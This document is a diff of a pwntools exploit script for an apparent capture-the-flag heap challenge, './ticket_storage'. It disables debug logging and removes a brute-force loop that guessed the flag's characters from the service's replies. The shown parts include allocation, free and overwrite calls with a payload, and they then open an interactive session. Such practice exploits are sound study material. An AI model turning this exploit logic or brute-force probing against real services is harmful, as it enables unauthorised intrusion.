@@ -1,5 +1,5 @@
 from pwn import *
-context.log_level = 'debug'
+# context.log_level = 'debug'
 context.arch = 'amd64'
 
 TARGET = './ticket_storage'
@@ -71,8 +71,7 @@ v5 = reserve('C', 'B')
 # view_list()
 v6 = reserve('C', 'B')
 # v7 = reserve('CCCC', 'BBBB')
-import string
-bag = string.ascii_lowercase + '0123456789'
+
 delete(v0)
 delete(v1)
 payload = '' 
@@ -97,23 +96,4 @@ change(payload)
 view('\x00'*9)
 
 r.interactive()
-for i in bag:
-    for j in bag:
-        for k in bag:
-            log.info(i+j+k)
-            view('Aero{'+i+j+k)
-            text = r.recvuntil('1. ')
-            if 'not' in text: 
-                continue
-            break
-        if 'not' in text: 
-            continue
-        break
 
-    if 'not' in text: 
-        continue
-    break
-# delete(v1)
-
-r.interactive()
-r.close()
